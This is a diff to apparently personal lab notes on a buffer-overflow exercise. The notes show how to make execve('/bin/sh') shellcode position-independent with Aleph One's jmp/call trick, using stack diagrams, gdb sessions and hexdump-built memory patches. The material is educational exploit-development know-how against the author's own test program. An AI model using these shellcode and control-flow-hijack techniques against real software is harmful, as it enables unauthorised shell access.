@@ -1,6 +1,5 @@
-/-------------- your editor should be this wide ------------------------------------------------------/
-
-
+Don't forget to mention that the addresses will differ based upon the process start method.
+All of my examples are running in a screen.  YM_W_V if you run otherwise.
 
 testy1.c notes
 
@@ -737,9 +736,273 @@ Step 6
 
 Modify the code so it does not use absolute addresses.
 
+So looking at the code there are three absolute addresses which we need to replace with 
+relative addresses.  The first is for writing a null pointer for our exec env call, the next
+two are for writing the addresses of the exec cmd string specifier.  The aleph one doc has a 
+neat trick for doing this.  He shows how you setup a jmp call combination.
+
+Here is a picture of the stack.
+
+towards top of stack
+Lower addresses
+Buffer ->					bufs index, s
+							start of shell code
+							...
+							...
+							...
+							end of shell code, the int $0x80
+							function pointer to our code.
+							The "/bin/sh" string including spot for null term string.
+							The env structure - parm one points to above
 
 
 
 
+Higher addresses
+towards bottom of stack
+
+
+For reference here is the man 2 execve page.
+       int execve(const char *filename, char *const argv[], char *const envp[]);
+
+and the man 3 page.
+
+[davis@yoshi stage2]$ man 3 execve
+ASIDE: $ apropos exec 
+<parts omitted>
+
+           #include <unistd.h>
+
+           int ret;
+           char *cmd[] = { "ls", "-l", (char *)0 };
+           char *env[] = { "HOME=/usr/home", "LOGNAME=home", (char *)0 };
+           ...
+           ret = execve ("/bin/ls", cmd, env);
+
+
+Looking at both, it becomes apparant why the command is placed first and then the pointer to
+the command is listed.  The first argv element is the command itself.  So if a program is run, say
+foo, like so:
+
+$ foo thing1 thing2
+
+Then the argv elements are
+
+argv[0] = /fqp/foo
+argv[1] = thing1
+argv[2] = thing2
+argv[3] = null
+
+So, our assembly translates like this in C.
+
+execve(cmd[0],cmd,NULL);
+
+We only need to know one address which can both be relative if we use aleph one's trick and the others
+can be figured out at runtime.
+
+towards top of stack
+Lower addresses
+                  Buffer ->  bufs index, s
+							 function pointer to our code.
+                             jump relative to call instruction.   ------------------------\
+                      /-->   start of shell code                                          |
+                      |      ...                                                          |
+                  (2) |      ...                                                          | (1)
+                      |      ...                                                          |
+                      |      end of shell code, the int $0x80                             |
+                      \----  call relative instruction to start of shell code  <----------/
+                             The "/bin/sh" string including spot for null term string.
+                             The env structure - parm one points to above
+
+
+
+
+Higher addresses
+towards bottom of stack
+
+His method works by placing the string right after the call.  When the call is performed,
+we know the return address is placed on the stack.  And in this case the return address
+will be the location of our cmd and cmd args for "/bin/sh".
+
+
+
+Since we are going to reuse this code where we don't have the artificial buf[2] construct,
+we might as well move the function pointer to the top so we can move all the code to one 
+contigous location.
+
+
+Start off with finding the starting point used by the model of the existing code in the c program.
+Run the code as is, just enter AAAA.  We will hit breakpoint in gdb and step to point before we
+assign s.
+
+You should see something like this:
+(gdb) x/4xw buf
+0xbffff330:     0x41414141      0x41414141      0x0000000a      0x00000000
+(gdb) x/4w ptrs
+0x80ec660 <ptrs>:       0x00000000      0x080488ee      0x0804898e      0x00000d00
+
+
+If the value for buf is different its because you are not in the first terminal running in a screen
+session.  We are going to use this static setup to build relocatable code.   If its not that address
+you can do the fixup using this technique for calculating the address for this model.
+
+
+conceptionally for this model memory looks like this:
+
+low memory addresses
+--------------------
+text
+main() is in this section
+
+
+---------------------
+data
+ptrs is in global memory as intialized data at 0x80ec660 ---\  (mention how this address varies)
+                                                            |
+  --------                                                  |
+     |                                                      |
+     v  heap grows down                                     |
+                                                            |  We want S to point to code
+                                                            |  in here.
+---------------------                                       |
+     ^ grows up                                             |
+     |                                                      |
+stack                                                       /
+buf is on stack at 0xbffff330                            <--
+
+
+---------------------
+high memory addresses
+
+
+From before:
+(now step until we assign s with next command)
+(gdb) set var s = 771509060
+(gdb) x/4xw ptrs
+0x80ec660 <ptrs>:       0x00000000      0x080488ee      0x0804898e      0x00000d00
+(gdb) print /x 0x80ec660+(s*4)
+$30 = 0xbffff370
+(gdb)
+
+370 is a nice even offset, but we are going to move our code around a bit so that the stuff required
+by the model are at the top of memory and then the relocatable shell code and finally with the
+strings at the end.
+
+How to determine the start address of the function pointer ptrs[s].
+Remember s is a pointer to a function, so it moves in increments of 4 bytes corresponding to
+addresses in IA32.
+
+Lets move it up to next word boundary following the index s.  S is 9 characters long or 9 bytes.  Ten
+if you count the null.  Pad 6 to get a word boundary so we can add a marker.  
+
+So, 
+0xbffff330 start of buf our s in ascii starts here.
+0xbffff340 is where we will store the function pointer
+
+So, we need s to be 340 instead of 370.
+
+(gdb) print /x 0x80ec660+((s-0x30/4)*4)
+$38 = 0xbffff340
+(gdb) print s-(0x30/4)
+$39 = 771509048
+(gdb) set var s = 771509048
+(gdb) print /x 0x80ec660+(s*4)
+$40 = 0xbffff340
+(gdb)
+
+Our first line of our patch will be
+set var s = 771509048
+
+The rest of the patch will need to formed from our assembly, nasm output, hexdump and vim.
+$  objdump -D testya3.o
+
+$ hexdump -s 0x110 -v -e'/1 "set var *((unsigned char *) 0xbffff330 %04_ax) = %#04x\n"' testya3.o  | head
+
+ASIDE: I'm using 330 as start so the leading part for s, ptrs[s] and markers will be in the patch.
+set var *((unsigned char *) 0xbffff330 0110) = 0x37
+set var *((unsigned char *) 0xbffff330 0111) = 0x37
+set var *((unsigned char *) 0xbffff330 0112) = 0x31
+set var *((unsigned char *) 0xbffff330 0113) = 0x35
+set var *((unsigned char *) 0xbffff330 0114) = 0x30
+
+As you can see, I don't know how to get the offset to print 0 based, but it can help when you 
+rewrite the patch in vim column mode.
+
+Rerun the program using the runit.sh and gdbit.sh sequence in screen so the addresses are the same.
+If you just run it will be different.  
+
+(gdb) next
+(gdb) x/4xw buf
+0xbffff330:     0x41414141      0x41414141      0x41414141      0x00000a41
+(gdb) refresh
+(gdb) source patch6.gdb 
+(gdb) next
+(gdb) print s
+$1 = 771509048
+(gdb) print ptrs[s]
+$2 = (fptr) 0xbffff350
+
+So, the model part works.  Now lets see what happens we step the code
+
+
+(gdb) layout next
+(gdb) layout next
+(gdb) stepi
+(gdb) refresh
+(gdb) stepi
+0xbffff350 in ?? ()  <-- this is our function pointer to the shell
+0xbffff363 in ?? ()  <-- this is our jmp to the call instruction
+0xbffff352 in ?? ()  <-- this is our call back to start of the shell code
+This is the esp prior to the pop 
+(gdb) print $esp
+$4 = (void *) 0xbffff328
+This is the esp after the pop.
+(gdb) stepi
+0xbffff353 in ?? ()
+(gdb) x/4xw $esp
+0xbffff368:     0x6e69622f      0x0068732f      0x00000000      0x00000000
+(gdb) print /s (char *) ($esp)
+$5 = 0xbffff368 "/bin/sh"
+
+So, there is our string.
+Whoops, I have an error in my assembly.  Its
+not 
+mov ebx, esp
+
+Patch up the assembly, nasm it and then patch using individual lines
+and then modify eip to rerun it.
+(gdb) set var *((unsigned char *) 0xbffff353) = 0x89
+(gdb) set var *((unsigned char *) 0xbffff354) = 0xe3
+(gdb) print eip
+No symbol "eip" in current context.
+(gdb) print $eip
+$9 = (void (*)()) 0xbffff356
+(gdb) set $eip 0xbffff353
+A syntax error in expression, near `0xbffff353'.
+(gdb) set $eip = 0xbffff353
+
+(gdb) print /x $ebx
+$10 = 0x6e69622f
+(gdb) stepi
+0xbffff355 in ?? ()
+(gdb) print /x $ebx
+$11 = 0xbffff368
+(gdb) print /s ($ebx)
+$12 = -1073745048
+(gdb) print /x $ebx  
+$13 = 0xbffff368
+(gdb) print /s (char *) ($ebx)
+$14 = 0xbffff368 "/bin/sh"
+
+While writing the assembly, remember this is our goal prior to the int 0x80.
+(gdb) print /x $eax
+$3 = 0xb
+(gdb) print /x $ebx
+$4 = 0xbffff374
+(gdb) print /x $ecx
+$5 = 0xbffff37c
+(gdb) x/4w 0xbffff374
+0xbffff374:     0x6e69622f      0x0068732f      0xbffff374      0x00000000
+(gdb) 
 
 
